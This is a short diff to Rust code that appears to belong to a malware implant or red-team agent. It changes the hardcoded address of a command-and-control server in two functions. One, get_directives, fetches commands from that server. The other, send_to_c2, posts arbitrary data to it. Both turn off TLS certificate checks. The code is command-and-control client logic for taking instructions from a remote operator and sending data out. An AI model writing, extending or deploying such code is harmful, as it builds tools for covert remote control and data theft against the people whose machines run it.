@@ -13,7 +13,7 @@ struct Directive {
 }
 
 pub async fn get_directives() -> Result<Vec<String>, Error> {
-    let url = "https://172.18.176.246:3030/directives";
+    let url = "https://172.28.161.20:3030/directives";
 
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
@@ -37,7 +37,7 @@ pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
         .build()?;
 
     let _res = client
-        .post("https://172.18.176.246:3030/directives")
+        .post("https://172.28.161.20:3030/directives")
         .body(data)
         .send()
         .await?;
